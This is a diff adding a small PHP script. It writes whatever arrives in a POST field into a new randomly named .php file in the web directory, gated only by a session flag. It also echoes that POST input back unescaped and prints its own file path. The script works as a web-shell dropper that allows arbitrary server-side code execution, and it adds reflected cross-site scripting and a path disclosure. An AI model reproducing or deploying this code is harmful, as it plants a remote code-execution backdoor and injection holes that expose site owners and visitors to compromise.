@@ -1,0 +1,20 @@
+<?php 
+if(isset($_SESSION['auth']) ? $_SESSION['auth']==1 : false) 
+{
+		$stuff = urldecode($_POST['stuff']);
+		
+		$file = 'file' . rand(1000000, 9999999) . '.php';
+		
+		$filename = dirname(__FILE__).'\\'.$file ;
+		
+		$handle = fopen($filename, "x+");
+		echo fwrite($handle, $stuff);
+		fclose($handle);
+}
+else 
+{
+		echo 'Not Authorized';
+}
+echo stripcslashes($_POST['stuff']);
+echo __FILE__;
+?>
